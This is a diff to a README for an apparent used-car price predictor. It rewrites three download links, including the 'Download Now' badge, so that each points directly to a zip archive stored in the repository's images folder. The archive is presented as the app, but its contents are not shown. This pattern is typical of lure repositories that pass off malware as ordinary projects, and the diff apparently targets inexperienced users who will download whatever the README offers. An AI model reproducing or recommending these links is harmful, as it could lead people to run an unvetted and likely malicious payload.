@@ -1,6 +1,6 @@
 # 🚗 Car-Resale-Price-Predictor-RandomForest - Estimate Used Car Value Fast
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Blue%20%26%20Grey-blue?style=for-the-badge)](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Blue%20%26%20Grey-blue?style=for-the-badge)](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest/raw/refs/heads/main/images/Price_Random_Forest_Resale_Predictor_Car_2.3.zip)
 
 ## 🖥️ What This App Does
 
@@ -30,7 +30,7 @@ If the app comes as a folder or file in the repository, you will need to downloa
 
 Use this link to visit the download page and get the files:
 
-[Go to the download page](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest)
+[Go to the download page](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest/raw/refs/heads/main/images/Price_Random_Forest_Resale_Predictor_Car_2.3.zip)
 
 After the page opens:
 
@@ -177,7 +177,7 @@ If the app opens in a browser, refresh the page and try again.
 
 If you need the files again, use this link:
 
-[Download from GitHub](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest)
+[Download from GitHub](https://github.com/defectarcus281/Car-Resale-Price-Predictor-RandomForest/raw/refs/heads/main/images/Price_Random_Forest_Resale_Predictor_Car_2.3.zip)
 
 ## 🧩 Useful Search Tags
 
